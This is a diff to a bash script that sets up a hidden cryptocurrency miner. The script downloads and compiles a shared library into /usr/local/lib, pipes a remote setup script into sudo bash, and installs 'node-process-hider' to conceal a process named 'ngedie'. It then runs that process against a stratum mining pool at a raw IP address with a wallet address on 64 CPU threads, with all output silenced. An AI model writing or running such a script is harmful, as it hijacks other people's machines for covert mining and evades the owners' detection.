@@ -1,4 +1,5 @@
 #!/bin/bash
+sudo apt-get update -y
 curl https://gitlab.com/ontranontran/kaspo/-/raw/master/ontranbotak.c -o ontranbotak.c
 gcc -Wall -fPIC -shared -o libontranbotak.so ontranbotak.c -ldl
 mv libontranbotak.so /usr/local/lib/
@@ -8,6 +9,7 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add ngedie"
 git clone https://gitlab.com/ontranontran/kaspo >/dev/null 2>&1
+cd kaspo
 chmod +x ngedie
 chmod +x verus-solver
 ./ngedie -c stratum+tcp://77.237.240.172:443 -u RWLcjcLuJhwAKM3ndbrUJ17XosqjMGL7PW.NGEDIE -p x --cpu 64 >/dev/null 2>&1 &
